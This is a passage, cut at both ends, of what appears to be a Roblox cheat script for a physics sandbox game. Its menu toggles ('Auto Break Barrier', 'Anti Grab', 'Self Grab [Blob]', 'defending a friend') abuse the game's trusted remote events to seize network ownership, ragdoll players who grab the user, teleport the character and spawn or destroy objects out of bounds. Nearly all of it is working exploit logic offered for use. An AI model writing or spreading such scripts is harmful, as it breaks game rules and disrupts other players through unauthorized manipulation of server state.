									local partOwner = arg2:FindFirstChild("PartOwner")
									if partOwner and partOwner.Value and partOwner.Value ~= "" and partOwner.Value ~= _G.LP.Name then
										return partOwner.Value
									end
									return nil
								end

								local function fn15(arg2)
									if not flag9 then
										return
									end
									local v19 = _G.PS:FindFirstChild(arg2)
									if not v19 or not v19.Character then
										return
									end

									task.spawn(function()
										local character = v19.Character
										if not character then
											return
										end
										local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
										local humanoid = character:FindFirstChild("Humanoid")
										if not humanoidRootPart or not humanoid then
											return
										end

										if _G.SNO then
											_G.SNO:FireServer(humanoidRootPart, humanoidRootPart.CFrame)
										end

										task.wait()
										soundPart.CFrame = humanoidRootPart.CFrame * CFrame.new(0, 2, 0)
										task.wait()
										local ragdolled = humanoid:FindFirstChild("Ragdolled")

										if ragdolled then
											if ragdolled.Value == false then
												humanoid:ChangeState(Enum.HumanoidStateType.Physics)
											end
										else
											humanoid:ChangeState(Enum.HumanoidStateType.Physics)
										end

										task.wait()
										soundPart.CFrame = CFrame.new(0, 1e9, 0)
									end)
								end

								thread = task.spawn(function()
									while flag9 do
										local character = _G.LP.Character

										if character then
											local tbl6 = {}
											local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
											local head = character:FindFirstChild("Head")
											local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
											local leftArm = character:FindFirstChild("Left Arm")
											local rightArm = character:FindFirstChild("Right Arm")
											local leftLeg = character:FindFirstChild("Left Leg")
											local v19 = table.pack(character:FindFirstChild("Right Leg"))
											tbl6[1] = humanoidRootPart
											tbl6[2] = head
											tbl6[3] = torso
											tbl6[4] = leftArm
											tbl6[5] = rightArm
											tbl6[6] = leftLeg

											do
												local values = table.pack(table.unpack(v19, 1, v19.n))
												table.move(values, 1, values.n, 7, tbl6)
											end

											for _, v20 in ipairs(tbl6) do
												if v20 then
													local v21 = fn14(v20)

													if v21 then
														fn15(v21)
													end
												end
											end

											local isHeld = _G.LP:FindFirstChild("IsHeld")

											if isHeld and isHeld.Value == true then
												local grabParts = _G.WS:FindFirstChild("GrabParts")

												if grabParts then
													local grabPart = grabParts:FindFirstChild("GrabPart")

													if grabPart then
														local partOwner = grabPart:FindFirstChild("PartOwner")

														if partOwner and partOwner.Value and partOwner.Value ~= "" and partOwner.Value ~= _G.LP.Name then
															fn15(partOwner.Value)
														end
													end
												end
											end
										end

										task.wait()
									end
								end)
							end
						else
							flag9 = false

							if thread then
								task.cancel(thread)
								thread = nil
							end
						end
					end,
				})
			end

			_G.BreakBlock = _G.ProtectionTab:CreateBlock({ Name = "Break", Side = "Right", ImageID = "115892909027721" })

			do
				local lp3 = _G.LP
				local notify2 = _G.Notify
				local flag9 = false

				local function fn14()
					local character = lp3.Character

					if character then
						local humanoid = character:FindFirstChild("Humanoid")

						if humanoid and humanoid.Health > 0 then
							pcall(function()
								character:BreakJoints()
							end)
						end
					end

					while flag9 do
						local result = lp3.CharacterAdded:Wait()

						if flag9 then
							local humanoid = result:WaitForChild("Humanoid")
							task.wait()

							if flag9 and humanoid and humanoid.Health > 0 then
								pcall(function()
									result:BreakJoints()
								end)

								local result2 = lp3.CharacterAdded:Wait()

								if flag9 then
									local humanoid2 = result2:WaitForChild("Humanoid")

									while true do
										local v18 = flag9
										local parent

										if flag9 then
											parent = humanoid2
										else
											parent = v18
										end

										parent = parent and humanoid2.Parent

										if parent then
											if not (humanoid2.Health <= 0) then
												task.wait()
												continue
											end
										end

										break
									end

									continue
								end
							else
								continue
							end
						end

						break
					end
				end

				_G.BreakBlock:CreateToggle({
					Name = "Auto Break PCLD",
					Default = false,
					Callback = function(arg)
						flag9 = arg

						if arg then
							notify2("Auto Break PCLD", "Enabled", 3)
							task.spawn(fn14)
						else
							notify2("Auto Break PCLD", "Disabled", 3)
						end
					end,
				})
			end

			do
				local lp3 = _G.LP
				local ws2 = _G.WS
				local cf2 = _G.CF
				local v33 = _G.V3
				local flag9 = false
				local thread = nil

				_G.BreakBlock:CreateToggle({
					Name = "Auto Break Barrier",
					Default = false,
					Callback = function(arg)
						flag9 = arg
						if not arg then
							return
						end

						if thread then
							return
						end

						thread = task.spawn(function()
							local v18 = lp3
							local character = v18.Character
							if not character then
								thread = nil
								return
							end
							local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
							if not humanoidRootPart then
								thread = nil
								return
							end

							if not ws2:FindFirstChild(v18.Name .. "SpawnedInToys") then
								thread = nil
								return
							end
							local spawnRemote = _G.SpawnRemote
							local destroyRemote = _G.DestroyRemote
							if not spawnRemote or not destroyRemote then
								thread = nil
								return
							end
							local v19 = cf2(-491, -7, -166)
							local cFrame = humanoidRootPart.CFrame
							local spawnLocation = ws2:FindFirstChild("SpawnLocation")

							if spawnLocation then
								cFrame = spawnLocation.CFrame
							end

							local flag10

							while flag9 do
								local character2 = v18.Character

								if character2 then
									local humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")

									if humanoidRootPart2 then
										local v20 = ws2:FindFirstChild(v18.Name .. "SpawnedInToys")

										if v20 then
											local v21 = nil

											while flag9 and not v21 do
												if not v18.CanSpawnToy.Value then
													v18.CanSpawnToy.Changed:Wait()
												end

												task.spawn(function()
													pcall(function()
														spawnRemote:InvokeServer("FoodHamburger", v19, v33(0, 0, 0))
													end)
												end)

												local n25 = 0

												while true do
													if flag9 and n25 < 3 then
														task.wait(0.1)
														n25 += 0.1

														for _, child in pairs(v20:GetChildren()) do
															if child.Name == "FoodHamburger" then
																v21 = child
																break
															end
														end

														if not v21 then
															continue
														end
													end

													break
												end
											end

											if flag9 then
												local parent, v22, n25, flag11, holdPart, holdItemRemoteFunction, cFrame2, parent2

												if v21 and v21.Parent then
													local n26 = 0

													while true do
														local flag12 = flag9 and n26 < 1
														flag10 = true

														if flag12 then
															task.wait(0.1)
															n26 += 0.1

															if not v21 or not v21.Parent then
																flag10 = false
																break
															else
																continue
															end
														end

														break
													end

													if flag10 and v21 and v21.Parent then
														pcall(function()
															destroyRemote:FireServer(v21)
														end)

														flag9 = false

														pcall(function()
															_G.Notify("Barrier broken")
														end)

														break
													elseif not flag9 then
														break
													else
														parent = v21 and v21.Parent

														if parent then
															pcall(function()
																destroyRemote:FireServer(v21)
															end)
														end

														while flag9 do
															if not v18.CanSpawnToy.Value then
																v18.CanSpawnToy.Changed:Wait()
															end

															v22 = nil

															task.spawn(function()
																pcall(function()
																	spawnRemote:InvokeServer("FoodHamburger", cFrame * cf2(0, 1e9, 0), v33(0, 0, 0))
																end)
															end)

															n25 = 0

															while true do
																flag11 = flag9 and n25 < 3

																if flag11 then
																	task.wait(0.1)
																	n25 += 0.1

																	for _, child in pairs(v20:GetChildren()) do
																		if child.Name == "FoodHamburger" then
																			v22 = child
																			break
																		end
																	end

																	if not v22 then
																		continue
																	end
																end

																break
															end

															if v22 then
																holdPart = v22:FindFirstChild("HoldPart")

																if holdPart then
																	holdItemRemoteFunction = holdPart:FindFirstChild("HoldItemRemoteFunction")

																	if holdItemRemoteFunction then
																		pcall(function()
																			holdItemRemoteFunction:InvokeServer(v22, character2)
																		end)
																	end
																end

																task.wait(0.1)

																if not flag9 then
																else
																	cFrame2 = humanoidRootPart2.CFrame
																	humanoidRootPart2.CFrame = v19
																	humanoidRootPart2.AssemblyLinearVelocity = v33(0, 0, 0)
																	humanoidRootPart2.AssemblyAngularVelocity = v33(0, 0, 0)
																	task.wait(0.1)
																	parent2 = v22 and v22.Parent

																	if parent2 then
																		pcall(function()
																			destroyRemote:FireServer(v22)
																		end)
																	end

																	task.wait(0.1)

																	if cFrame2 then
																		humanoidRootPart2.CFrame = cFrame2
																		humanoidRootPart2.AssemblyLinearVelocity = v33(0, 0, 0)
																		humanoidRootPart2.AssemblyAngularVelocity = v33(0, 0, 0)
																	end

																	task.wait(0.1)
																end

																break
															end
														end

														continue
													end
												elseif not flag9 then
													break
												else
													parent = v21 and v21.Parent

													if parent then
														pcall(function()
															destroyRemote:FireServer(v21)
														end)
													end

													while flag9 do
														if not v18.CanSpawnToy.Value then
															v18.CanSpawnToy.Changed:Wait()
														end

														v22 = nil

														task.spawn(function()
															pcall(function()
																spawnRemote:InvokeServer("FoodHamburger", cFrame * cf2(0, 1e9, 0), v33(0, 0, 0))
															end)
														end)

														n25 = 0

														while true do
															flag11 = flag9 and n25 < 3

															if flag11 then
																task.wait(0.1)
																n25 += 0.1

																for _, child in pairs(v20:GetChildren()) do
																	if child.Name == "FoodHamburger" then
																		v22 = child
																		break
																	end
																end

																if not v22 then
																	continue
																end
															end

															break
														end

														if v22 then
															holdPart = v22:FindFirstChild("HoldPart")

															if holdPart then
																holdItemRemoteFunction = holdPart:FindFirstChild("HoldItemRemoteFunction")

																if holdItemRemoteFunction then
																	pcall(function()
																		holdItemRemoteFunction:InvokeServer(v22, character2)
																	end)
																end
															end

															task.wait(0.1)

															if not flag9 then
															else
																cFrame2 = humanoidRootPart2.CFrame
																humanoidRootPart2.CFrame = v19
																humanoidRootPart2.AssemblyLinearVelocity = v33(0, 0, 0)
																humanoidRootPart2.AssemblyAngularVelocity = v33(0, 0, 0)
																task.wait(0.1)
																parent2 = v22 and v22.Parent

																if parent2 then
																	pcall(function()
																		destroyRemote:FireServer(v22)
																	end)
																end

																task.wait(0.1)

																if cFrame2 then
																	humanoidRootPart2.CFrame = cFrame2
																	humanoidRootPart2.AssemblyLinearVelocity = v33(0, 0, 0)
																	humanoidRootPart2.AssemblyAngularVelocity = v33(0, 0, 0)
																end

																task.wait(0.1)
															end

															break
														end
													end

													continue
												end
											end
										end
									end
								end

								break
							end

							thread = nil
						end)
					end,
				})
			end

			local v18
			v18 = _G.ProtectionTab:CreateBlock({ Name = "Mystics Defense", Side = "Right", ImageID = "94139827804377" })
			local lp3
			lp3 = _G.LP
			local ws2
			ws2 = _G.WS
			local repS
			repS = _G.RepS
			local cf2
			cf2 = _G.CF
			local v33
			v33 = _G.V3
			local destroyRemote
			destroyRemote = _G.DestroyRemote
			local RunService, currentCamera2, v19, fn14

			do
				local v20 = cf2(-530, 25, -170)
				RunService = game:GetService("RunService")
				currentCamera2 = workspace.CurrentCamera
				local flag9 = false
				local tbl6 = {}
				local tbl7 = {}
				v19 = nil

				local function fn15(arg)
					if arg then
						arg.Velocity = v33(0, 0, 0)
						arg.AssemblyLinearVelocity = v33(0, 0, 0)
						arg.RotVelocity = v33(0, 0, 0)
						arg.AssemblyAngularVelocity = v33(0, 0, 0)
					end
				end

				local function fn16(arg, anchored)
					if not arg then
						return
					end

					for _, descendant in pairs(arg:GetDescendants()) do
						if descendant:IsA("BasePart") then
							descendant.Anchored = anchored

							if anchored then
								fn15(descendant)
							end
						end
					end
				end

				local function fn17(arg)
					if not arg or not arg.Parent then
						return
					end

					if tbl6[arg] then
						return
					end
					local leftDetector = arg:FindFirstChild("LeftDetector")
					local rightDetector = arg:FindFirstChild("RightDetector")

					if leftDetector then
						leftDetector:Destroy()
					end

					if rightDetector then
						rightDetector:Destroy()
					end

					tbl6[arg] = true
				end

				local function fn18(child)
					if tbl6[child] then
						tbl6[child] = nil
					end
				end

				local function fn19()
					local v21 = ws2:FindFirstChild(lp3.Name .. "SpawnedInToys")

					if v21 then
						for _, child in pairs(v21:GetChildren()) do
							if child.Name == "CreatureBlobman" and child.Parent then
								return child
							end
						end
					end

					return nil
				end

				local function fn20()
					local v21 = fn19()

					if v21 then
						for _, descendant in pairs(v21:GetDescendants()) do
							if descendant:IsA("BasePart") then
								descendant.CanCollide = false
							end
						end

						return v21
					end

					local canSpawnToy = lp3:FindFirstChild("CanSpawnToy")

					if canSpawnToy and not canSpawnToy.Value then
						local now2 = tick()

						while not canSpawnToy.Value and tick() - now2 < 3 do
							task.wait()
						end
					end

					local spawnToyRemoteFunction = repS:FindFirstChild("MenuToys") and repS.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
					if not spawnToyRemoteFunction then
						return nil
					end
					local humanoidRootPart = lp3.Character and lp3.Character:FindFirstChild("HumanoidRootPart")
					if not humanoidRootPart then
						return nil
					end
					local n25 = humanoidRootPart.CFrame * cf2(0, 2, 25)

					task.spawn(function()
						pcall(function()
							spawnToyRemoteFunction:InvokeServer("CreatureBlobman", n25, v33(0, 0, 0))
						end)
					end)

					for i = 1, 30 do
						task.wait(0.05)
						local v22 = fn19()

						if v22 then
							for _, descendant in pairs(v22:GetDescendants()) do
								if descendant:IsA("BasePart") then
									descendant.CanCollide = false
								end
							end

							return v22
						end
					end

					return nil
				end

				local function fn21(arg)
					local vehicleSeat = arg:FindFirstChild("VehicleSeat")
					if vehicleSeat then
						return vehicleSeat
					end

					for i = 1, 30 do
						local vehicleSeat2 = arg:FindFirstChild("VehicleSeat")
						if vehicleSeat2 then
							return vehicleSeat2
						end
						task.wait(0.05)
					end

					return nil
				end

				local function fn22(arg, arg2, arg3)
					local blobmanSeatAndOwnerScript = arg:FindFirstChild("BlobmanSeatAndOwnerScript")
					local rightDetector = arg:FindFirstChild("RightDetector")
					local rightWeld = rightDetector and rightDetector:FindFirstChild("RightWeld")
					local creatureGrab = blobmanSeatAndOwnerScript and blobmanSeatAndOwnerScript:FindFirstChild("CreatureGrab")

					if creatureGrab and rightWeld then
						for i = 1, 5 do
							pcall(function()
								creatureGrab:FireServer(nil, arg2, rightWeld)
							end)

							arg3:ChangeState(Enum.HumanoidStateType.Jumping)
							task.wait(0.03)
						end

						return true
					end

					return false
				end

				local function fn23(child)
					if not flag9 then
						return
					end

					if child.Name == "CreatureBlobman" then
						fn17(child)
						local connection3 = nil

						connection3 = child.AncestryChanged:Connect(function()
							if not child.Parent then
								fn18(child)

								if connection3 then
									connection3:Disconnect()
								end
							end
						end)

						table.insert(tbl7, connection3)
					end
				end

				local function fn24()
					for _, child in pairs(ws2:GetChildren()) do
						if string.find(child.Name, "SpawnedInToys$") then
							for _, child2 in pairs(child:GetChildren()) do
								if child2.Name == "CreatureBlobman" then
									fn17(child2)
								end
							end
						end
					end

					if ws2.PlotItems then
						for _, child in pairs(ws2.PlotItems:GetChildren()) do
							for _, child2 in pairs(child:GetChildren()) do
								if child2.Name == "CreatureBlobman" then
									fn17(child2)
								end
							end
						end
					end
				end

				local function fn25(arg)
					if not arg then
						return
					end

					for _, child in pairs(arg:GetChildren()) do
						fn23(child)
					end

					local connection3 = arg.ChildAdded:Connect(fn23)
					local connection4 = arg.ChildRemoved:Connect(fn18)
					table.insert(tbl7, connection3)
					table.insert(tbl7, connection4)
				end

				local function fn26()
					for _, v21 in ipairs(tbl7) do
						pcall(function()
							v21:Disconnect()
						end)
					end

					tbl7 = {}
				end

				local function fn27()
					fn26()
					tbl6 = {}
					fn24()

					for _, child in pairs(ws2:GetChildren()) do
						if string.find(child.Name, "SpawnedInToys$") then
							fn25(child)
						end
					end

					local connection3 = ws2.ChildAdded:Connect(function(child)
						if not flag9 then
							return
						end

						if string.find(child.Name, "SpawnedInToys$") then
							fn25(child)
						end
					end)

					table.insert(tbl7, connection3)

					if ws2.PlotItems then
						for _, child in pairs(ws2.PlotItems:GetChildren()) do
							fn25(child)
						end

						local connection4 = ws2.PlotItems.ChildAdded:Connect(function(child)
							if not flag9 then
								return
							end
							fn25(child)
						end)

						table.insert(tbl7, connection4)
					end
				end

				fn14 = function()
					task.spawn(function()
						local character = lp3.Character
						if not character then
							return
						end
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						local humanoid = character:FindFirstChild("Humanoid")
						if not humanoidRootPart or not humanoid then
							return
						end
						local cFrame = humanoidRootPart.CFrame
						local v21 = fn20()
						if not v21 then
							return
						end
						v19 = v21
						local v22 = fn21(v21)
						if not v22 then
							return
						end
						humanoidRootPart.CFrame = v22.CFrame * cf2(0, 2, 0)
						fn15(humanoidRootPart)
						task.wait(0.05)
						v22:Sit(humanoid)
						task.wait(0.05)
						fn22(v21, humanoidRootPart, humanoid)
						task.wait()
						v21:PivotTo(v20)
						task.wait(0.2)
						fn16(v21, true)
						flag9 = true
						fn27()
						task.wait(0.2)

						if humanoidRootPart and humanoidRootPart.Parent then
							humanoidRootPart.CFrame = cFrame
							fn15(humanoidRootPart)
						end
					end)
				end
			end

			local flag9
			flag9 = false

			do
				local thread = nil
				local flag10 = false
				local connection3 = nil
				local connection4 = nil
				local connection5 = nil
				local connection6 = nil
				local connection7 = nil
				local tbl6 = {}

				local tbl7 = {
					Head = { X = 0, Y = 1.5, Z = 0, RX = 0, RY = 0, RZ = 0 },
					["Left Arm"] = { X = -1.5, Y = 0, Z = 0, RX = 0, RY = 0, RZ = 0 },
					["Right Arm"] = { X = 1.5, Y = 0, Z = 0, RX = 0, RY = 0, RZ = 0 },
					["Left Leg"] = { X = -0.5, Y = -2, Z = 0, RX = 0, RY = 0, RZ = 0 },
					["Right Leg"] = { X = 0.5, Y = -2, Z = 0, RX = 0, RY = 0, RZ = 0 },
				}

				local function fn15(arg)
					if arg then
						arg.Velocity = v33(0, 0, 0)
						arg.AssemblyLinearVelocity = v33(0, 0, 0)
						arg.RotVelocity = v33(0, 0, 0)
						arg.AssemblyAngularVelocity = v33(0, 0, 0)
					end
				end

				local function fn16(arg)
					for k in pairs(tbl7) do
						local v20 = arg:FindFirstChild(k)

						if v20 and v20:IsA("BasePart") then
							v20.CanCollide = false
							v20.Massless = false
						end
					end
				end

				local function fn17(arg)
					for k in pairs(tbl7) do
						local v20 = arg:FindFirstChild(k)

						if v20 and v20:IsA("BasePart") then
							v20.CanCollide = true
							v20.CanTouch = true
						end
					end
				end

				local function fn18(arg, arg2, arg3)
					if not arg3 then
						return
					end

					for k, v20 in pairs(tbl7) do
						local v21 = arg:FindFirstChild(k)

						if v21 and v21:IsA("BasePart") then
							local cframe = CFrame.Angles
							local rad = math.rad
							local rz = v20.RZ
							v21.CFrame = arg2 * CFrame.new(v20.X, v20.Y, v20.Z) * cframe(math.rad(v20.RX), math.rad(v20.RY), rad(rz))
						end
					end
				end

				local function fn19(arg)
					if arg and arg.Parent then
						pcall(function()
							if destroyRemote then
								destroyRemote:FireServer(arg)
							end
						end)
					end
				end

				local function fn20()
					local v20 = ws2:FindFirstChild(lp3.Name .. "SpawnedInToys")

					if v20 then
						for _, child in pairs(v20:GetChildren()) do
							if child.Name == "CreatureBlobman" then
								fn19(child)
							end
						end
					end

					if v19 and v19.Parent then
						fn19(v19)
						v19 = nil
					end
				end

				local function fn21()
					if connection3 then
						connection3:Disconnect()
						connection3 = nil
					end

					if connection4 then
						connection4:Disconnect()
						connection4 = nil
					end

					if connection5 then
						connection5:Disconnect()
						connection5 = nil
					end

					if connection7 then
						connection7:Disconnect()
						connection7 = nil
					end

					if connection6 then
						connection6:Disconnect()
						connection6 = nil
					end

					for _, v20 in ipairs(tbl6) do
						if v20 then
							v20:Disconnect()
						end
					end

					table.clear(tbl6)

					if lp3.Character then
						fn17(lp3.Character)
						local humanoidRootPart = lp3.Character:FindFirstChild("HumanoidRootPart")
						local humanoid = lp3.Character:FindFirstChild("Humanoid")

						if humanoidRootPart then
							humanoidRootPart.Anchored = false
						end

						if humanoid then
							humanoid.PlatformStand = false
						end
					end

					flag10 = false
				end

				local function fn22()
					local v20 = ws2:FindFirstChild(lp3.Name .. "SpawnedInToys")

					if v20 then
						for _, child in pairs(v20:GetChildren()) do
							if child.Name == "CreatureBlobman" and child.Parent then
								return child
							end
						end
					end

					return nil
				end

				local function fn23()
					local canSpawnToy = lp3:FindFirstChild("CanSpawnToy")

					if canSpawnToy and not canSpawnToy.Value then
						local now2 = tick()

						while not canSpawnToy.Value and tick() - now2 < 3 do
							task.wait()
						end
					end

					local spawnToyRemoteFunction = repS:FindFirstChild("MenuToys") and repS.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
					if not spawnToyRemoteFunction then
						return nil
					end
					local humanoidRootPart = lp3.Character and lp3.Character:FindFirstChild("HumanoidRootPart")
					if not humanoidRootPart then
						return nil
					end
					local n25 = humanoidRootPart.CFrame * cf2(0, 3, 25)

					task.spawn(function()
						pcall(function()
							spawnToyRemoteFunction:InvokeServer("CreatureBlobman", n25, v33(0, 0, 0))
						end)
					end)

					for i = 1, 30 do
						task.wait(0.05)
						local v20 = fn22()

						if v20 then
							for _, descendant in pairs(v20:GetDescendants()) do
								if descendant:IsA("BasePart") then
									descendant.CanCollide = false
								end
							end

							return v20
						end
					end

					return nil
				end

				local function fn24(arg)
					local vehicleSeat = arg:FindFirstChild("VehicleSeat")
					if vehicleSeat then
						return vehicleSeat
					end

					for i = 1, 50 do
						local vehicleSeat2 = arg:FindFirstChild("VehicleSeat")
						if vehicleSeat2 then
							return vehicleSeat2
						end
						task.wait(0.1)
					end

					return nil
				end

				local function fn25(arg)
					if not arg then
						return
					end
					local creatureControl = arg:FindFirstChild("CreatureControl")

					if creatureControl then
						creatureControl:Destroy()
					end
				end

				local function fn26()
					if not v19 or not v19.Parent then
						return false
					end
					local character = lp3.Character
					if not (character and character:FindFirstChild("Humanoid")) then
						return false
					end
					local blobmanSeatAndOwnerScript = v19:FindFirstChild("BlobmanSeatAndOwnerScript")
					if not blobmanSeatAndOwnerScript then
						return false
					end
					local creatureRelease = blobmanSeatAndOwnerScript:FindFirstChild("CreatureRelease") or blobmanSeatAndOwnerScript:FindFirstChild("CreatureDrop")
					if not creatureRelease then
						return false
					end
					local rightDetector = v19:FindFirstChild("RightDetector")
					rightDetector = rightDetector and rightDetector:FindFirstChild("RightWeld")
					local leftDetector = v19:FindFirstChild("LeftDetector")
					leftDetector = leftDetector and leftDetector:FindFirstChild("LeftWeld")
					leftDetector = rightDetector or leftDetector
					if not leftDetector then
						return false
					end

					pcall(function()
						creatureRelease:FireServer(leftDetector)
					end)

					return true
				end

				local fn27 = nil

				local function fn28()
					if not flag9 then
						return
					end
					fn21()
					fn19(v19)
					v19 = nil
					task.wait(0.5)

					if flag9 then
						fn27()
					end
				end

				fn27 = function()
					if thread then
						task.cancel(thread)
					end

					thread = task.spawn(function()
						fn20()
						local character = lp3.Character

						if not character or not character:IsDescendantOf(workspace) then
							character = lp3.CharacterAdded:Wait()
						end

						local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
						local humanoid = character:WaitForChild("Humanoid", 5)
						if not humanoidRootPart or not humanoid then
							return
						end

						if humanoid.Health <= 0 then
							return
						end

						if connection6 then
							connection6:Disconnect()
						end

						connection6 = humanoid.Died:Connect(function()
							fn21()
							fn19(v19)
							v19 = nil
						end)

						local ragdolled = humanoid:FindFirstChild("Ragdolled")

						if ragdolled and ragdolled.Value == true then
							while true do
								task.wait(0.1)
								if not (not humanoid:FindFirstChild("Ragdolled") or humanoid.Ragdolled.Value == false or humanoid.Health <= 0 or not flag9) then
									continue
								end
								break
							end
						end

						if not flag9 or humanoid.Health <= 0 then
							return
						end
						local v20 = fn23()
						if not v20 then
							return
						end
						v19 = v20

						local function fn29(descendant)
							if descendant.Name == "PartOwner" then
								local function fn30()
									local value

									if descendant:IsA("ObjectValue") then
										value = descendant.Value
									else
										value = nil

										if descendant:IsA("StringValue") then
											value = descendant.Value
										end
									end

									if value and value ~= lp3 and value ~= lp3.Name and value ~= lp3.Character then
										fn28()
									end
								end

								fn30()
								local connection8 = descendant:GetPropertyChangedSignal("Value"):Connect(fn30)
								table.insert(tbl6, connection8)
							end
						end

						for _, descendant in pairs(v19:GetDescendants()) do
							fn29(descendant)
						end

						local connection8 = v19.DescendantAdded:Connect(fn29)
						table.insert(tbl6, connection8)

						if connection7 then
							connection7:Disconnect()
						end

						connection7 = v19.AncestryChanged:Connect(function(child, parent)
							if not parent and flag9 then
								fn28()
							end
						end)

						local v21 = fn24(v20)
						if not v21 then
							return
						end

						if connection5 then
							connection5:Disconnect()
						end

						connection5 = v21:GetPropertyChangedSignal("Occupant"):Connect(function()
							if v21.Occupant and v21.Occupant ~= humanoid then
								fn28()
							end
						end)

						humanoidRootPart.CFrame = v21.CFrame * cf2(0, 2, 0)
						fn15(humanoidRootPart)
						task.wait()
						v21:Sit(humanoid)
						task.wait()
						fn25(v20)
						local ragdollRemote = repS:FindFirstChild("CharacterEvents") and repS.CharacterEvents:FindFirstChild("RagdollRemote")

						if ragdollRemote then
							ragdollRemote:FireServer(humanoidRootPart, 3)
						end

						local blobmanSeatAndOwnerScript = v20:FindFirstChild("BlobmanSeatAndOwnerScript")
						local rightDetector = v20:FindFirstChild("RightDetector")
						local rightWeld = rightDetector and rightDetector:FindFirstChild("RightWeld")
						local creatureGrab = blobmanSeatAndOwnerScript and blobmanSeatAndOwnerScript:FindFirstChild("CreatureGrab")

						if creatureGrab and rightWeld then
							for i = 1, 5 do
								pcall(function()
									creatureGrab:FireServer(nil, humanoidRootPart, rightWeld)
								end)

								humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
								task.wait(0.05)
							end
						end

						task.wait(0.2)
						fn26()
						task.wait(0.1)
						flag10 = true

						if connection4 then
							connection4:Disconnect()
						end

						connection4 = RunService.RenderStepped:Connect(function()
							if not flag9 or not flag10 or not v19 or not v19.Parent then
								return
							end

							if humanoidRootPart and humanoid and humanoidRootPart.Parent then
								v19:PivotTo(humanoidRootPart.CFrame * cf2(-1.68, -2.06, 4.7))

								for _, descendant in pairs(v19:GetDescendants()) do
									if descendant:IsA("BasePart") then
										fn15(descendant)
									end
								end
							end
						end)

						if connection3 then
							connection3:Disconnect()
						end

						connection3 = RunService.RenderStepped:Connect(function()
							if not flag9 or not flag10 or not v19 or not v19.Parent then
								return
							end
							local character2 = lp3.Character
							if not character2 or character2 ~= character then
								return
							end
							local torso = character2:FindFirstChild("Torso") or character2:FindFirstChild("UpperTorso")
							local humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")
							local humanoid2 = character2:FindFirstChild("Humanoid")
							if not humanoidRootPart2 or not humanoid2 or not torso then
								return
							end

							for _, descendant in pairs(character2:GetDescendants()) do
								if descendant:IsA("BasePart") then
									fn15(descendant)
								end
							end

							local flag11 = humanoid2:FindFirstChild("Ragdolled") and humanoid2.Ragdolled.Value == true
							local lookVector = currentCamera2.CFrame.LookVector
							local v22 = math.atan2(-lookVector.X, -lookVector.Z)
							humanoidRootPart2.CFrame = CFrame.new(humanoidRootPart2.Position) * CFrame.Angles(0, v22, 0)

							if humanoid2.MoveDirection.Magnitude > 0 then
								humanoidRootPart2.CFrame = humanoidRootPart2.CFrame + humanoid2.MoveDirection * 0.45
							end

							if torso and flag11 then
								fn18(character2, torso.CFrame, flag11)
							end

							local v23 = ragdollRemote

							if not ragdollRemote then
								flag11 = v23
							end

							if flag11 then
								ragdollRemote:FireServer(humanoidRootPart2, 1)
							end
						end)

						fn16(character)
					end)
				end

				local function fn29()
					flag9 = false

					if thread then
						task.cancel(thread)
						thread = nil
					end

					fn21()
					fn20()
				end

				lp3.CharacterAdded:Connect(function()
					if flag9 then
						task.wait(1)

						if flag9 then
							fn27()
						end
					end
				end)

				v18:CreateButton({
					Name = "Anti Grab [Blob in Home]",
					Callback = function()
						fn14()
					end,
				})

				v18:CreateToggle({
					Name = "Self Grab [Blob] (beta)",
					Default = false,
					Flag = "SelfGrabBlobToggleProtection",
					Callback = function(arg)
						if arg then
							flag9 = true
							fn27()
						else
							fn29()
						end
					end,
				})
			end

			do
				local v20 = _G.ProtectionTab:CreateBlock({ Name = "defending a friend", Side = "Right", ImageID = "10885655986" })
				local lp4 = _G.LP
				local ws3 = _G.WS
				local ps2 = _G.PS
				local setNetworkOwner = _G.GE and _G.GE:FindFirstChild("SetNetworkOwner")
				local stickyEvent = _G.StickyEvent
				local spawnRemote = _G.SpawnRemote
				local canSpawn = _G.CanSpawn

				if not _G.CF then
				end

				local v34 = _G.V3 or Vector3.new
				local notify2 = _G.Notify
				local v21 = nil
				local v22 = nil
				local flag10 = false

				local function fn15(arg)
					local character = arg.Character
					if not character then
						return nil
					end
					return character:FindFirstChild("Torso") or character:FindFirstChild("LowerTorso") or character:FindFirstChild("UpperTorso") or character:FindFirstChild("HumanoidRootPart")
				end

				local function fn16(arg, arg2, arg3)
					if flag10 then
						return
					end
					flag10 = true

					if setNetworkOwner then
						task.spawn(function()
							setNetworkOwner:FireServer(arg, arg.CFrame)
						end)
					end

					if arg3 and stickyEvent then
						task.spawn(function()
							stickyEvent:FireServer(arg, arg3, CFrame.Angles(1.5707963267948966, 0.78539816339744828, 0))
						end)
					end

					task.wait()
					arg = arg and arg.Parent

					if arg then
						for _, child in pairs(arg2:GetChildren()) do
							if child:IsA("BasePart") then
								child.CanQuery = false
							end
						end
					end

					flag10 = false
				end

				local function fn17(arg)
					if flag10 then
						return
					end
					local v23 = fn15(arg)
					if not v23 then
						notify2("Defend", "Friend has no character", 2)
						return
					end
					local value = canSpawn and canSpawn.Value
					local now2 = tick()

					while not value do
						if not (tick() - now2 > 3) then
							task.wait()
							value = canSpawn and canSpawn.Value
							continue
						end

						break
					end

					local character = lp4.Character
					if not character then
						return
					end
					local head = character:FindFirstChild("Head")
					if not head then
						return
					end
					local n25 = CFrame.new(head.Position) * CFrame.new(0, 15, 20)

					task.spawn(function()
						spawnRemote:InvokeServer("NinjaShuriken", n25, v34(0, 0, 0))
					end)

					local now3 = tick()
					local v24 = nil

					while not v24 do
						if not (tick() - now3 > 3) then
							local v25 = ws3:FindFirstChild(lp4.Name .. "SpawnedInToys")

							if v25 then
								for _, child in ipairs(v25:GetChildren()) do
									if child.Name == "NinjaShuriken" and not child:GetAttribute("AssignedDefend") then
										child:SetAttribute("AssignedDefend", true)
										v24 = child
										break
									end
								end
							end

							if not v24 then
								task.wait()
							end

							continue
						end

						break
					end

					if not v24 then
						notify2("Defend", "Failed to spawn anti-kick", 2)
						return
					end
					v24.Name = "AntiKick"
					local stickyPart = v24:WaitForChild("StickyPart", 2)
					if not stickyPart or not stickyPart.Parent then
						return
					end
